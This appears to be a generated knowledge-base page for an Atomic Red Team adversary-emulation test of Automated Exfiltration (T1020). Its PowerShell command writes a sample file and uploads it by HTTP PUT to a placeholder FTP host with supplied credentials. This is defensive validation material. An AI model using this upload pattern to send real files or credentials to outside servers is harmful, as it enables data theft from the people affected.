---
atomic_guid: "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac"
title: "Exfiltration via Encrypted FTP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1020"
attack_technique_name: "Automated Exfiltration"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac"
  - "Exfiltration via Encrypted FTP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.

## ATT&CK Mapping

- [[kb/attack/techniques/T1020-automated_exfiltration|T1020: Automated Exfiltration]]

## Input Arguments

### credentials

- description: FTP server credentials.
- type: String
- default: [user:password]

### ftpServer

- description: FTP server URL.
- type: Url
- default: ftp://example.com

### sampleFile

- description: Path of the sample file to exfiltrate.
- type: String
- default: C:\temp\T1020__FTP_sample.txt

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$sampleData = "Sample data for exfiltration test"
Set-Content -Path "#{sampleFile}" -Value $sampleData
$ftpUrl = "#{ftpServer}"
$creds = Get-Credential -Credential "#{credentials}"
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
```

### Cleanup

```powershell
Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.yaml)
